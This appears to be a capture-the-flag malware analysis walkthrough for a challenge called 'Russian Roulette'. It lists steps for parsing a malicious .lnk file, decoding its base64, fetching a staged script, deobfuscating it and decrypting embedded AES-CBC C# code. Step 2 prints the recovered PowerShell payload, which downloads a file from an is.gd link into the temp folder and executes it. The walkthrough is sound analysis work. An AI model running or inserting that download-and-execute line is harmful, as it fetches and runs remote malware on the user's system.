# Russian Roulette

1. Analyze the `.lnk` file, use `parse_lnk()` in [`russian_roulette.py`](russian_roulette.py)
2. Decode the base64 there and discover a payload `iwr is.gd/jwr7JD -o $env:TMP/.cmd;& $env:TMP/.cmd`
3. Download the `is.gd` link (saved into `cmd_from_is.gd`)
4. Get rid of the encoding and comments: `cat cmd_from_is.gd  | grep -e '^::' -v | dd of=try0 bs=1 skip=2`
5. Manually search/replace some of the first obfuscation (~15 top lines +/-), saved to `try1`
6. Split off the 2nd part of the file into `try1.1`
7. Use `deobfuscate()` in [`russian_roulette.py`](russian_roulette.py), saves into `try1.2`
8. Extract the base64 blob into `try1.2a`, decode it `cat try1.2a | base64 -D`
9. Extract the C# code from it - guestimate it is AES-CBC
10. Use `decrypt()` in [`russian_roulette.py`](russian_roulette.py).
